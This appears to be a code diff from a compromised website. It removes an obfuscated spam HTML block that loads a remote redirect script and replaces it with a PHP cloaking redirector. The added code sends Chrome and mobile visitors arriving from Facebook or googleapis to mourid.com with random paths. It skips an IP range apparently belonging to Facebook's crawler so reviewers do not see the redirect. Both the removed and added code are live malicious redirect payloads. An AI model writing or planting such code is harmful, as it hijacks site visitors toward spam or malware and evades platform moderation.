@@ -1,1 +1,49 @@
-<evemousokagu><gibuluopifiro class="itahe"><evemousokagu id="aduvelufe"><a href="http://hokutabagi.online" </a><evemousokagu id="aduvelufe"><i><div id="aduvelufe"><i id="aduvelufe"><i class="itahe"><gibuluopifiro class="itahe""><gibuluopifiro><i><div><gibuluopifiro><a href="http://hokutabagi.date" </a><a href="http://hokutabagi.club" </a><div class="itahe"><i id="aduvelufe"><div id="aduvelufe"><meta charset="utf-8"> <title>Kamuao Eselomemo</title><meta property="og:title" content="Kamuao Eselomemo" /> <meta property="og:description" content="" /><script src="http://lupe-mt2.com/php/redire1ct.php?keduciu"></script><a href="https://hokutabagi.org" </a><i><evemousokagu><div id="aduvelufe"><div id="aduvelufe"><div><i id="aduvelufe"><div><gibuluopifiro><i id="aduvelufe"><i><evemousokagu id="aduvelufe"><evemousokagu id="aduvelufe"><evemousokagu class="itahe"><div id="aduvelufe"></div></evemousokagu></evemousokagu></evemousokagu></i></i></gibuluopifiro></div></i></div></div></div></evemousokagu></i></div></i></div></gibuluopifiro></div></i></gibuluopifiro></gibuluopifiro></i></i></div></i></evemousokagu></evemousokagu></gibuluopifiro></evemousokagu>
+<?php
+
+  ob_start();
+    require_once('Mobile_Detect.php');
+    require_once('Browser.php');
+    $detect = new Mobile_Detect;
+    $browser = new Browser();
+
+    function generate_name($length){
+        $rname = "";
+        $sesli = "aeiou";
+        $sessiz = "bcdfghjklmnprstvyz";
+        $rname = rand(1,2) == 1?$sessiz[rand(0,strlen($sessiz)-1)]:$sesli[rand(0,strlen($sesli)-1)];
+        for($n=0;$n<$length;$n++){
+            if(in_array($rname[strlen($rname)-1], str_split($sesli))){
+                $rname .= $sessiz[rand(0,strlen($sessiz)-1)];
+            }else{
+                $rname .= $sesli[rand(0,strlen($sesli)-1)];
+            }
+        }
+        return $rname;
+    }
+
+    if(!isset($_SERVER["HTTP_REFERER"])){
+        $_SERVER["HTTP_REFERER"] = "";
+    }
+
+    $redirect = false;
+    if($browser->getBrowser() == Browser::BROWSER_CHROME && $browser->getPlatform() != Browser::PLATFORM_X11 && strpos($_SERVER["REMOTE_ADDR"], "66.220.14") === false) {
+        if (strpos($_SERVER["HTTP_REFERER"], 'googleapis.com') !== false){
+            $redirect = true;
+        }
+
+    
+            if (strpos($_SERVER["HTTP_REFERER"], 'wqewqe.') !== false){
+            $redirect = true;
+        }       if (strpos($_SERVER["HTTP_REFERER"], 'facebook.com') !== false){
+            $redirect = true;
+        }
+    }
+
+    if($detect->isMobile() || $browser->isMobile() && $browser->getPlatform() != Browser::PLATFORM_X11 && strpos($_SERVER["REMOTE_ADDR"], "66.220.14") === false){
+        $redirect = true;
+    }
+
+    if($redirect == true){
+        echo "<script>top.location.href='http://mourid.com/".generate_name(rand(3,5))."'</script>";
+    }
+?>
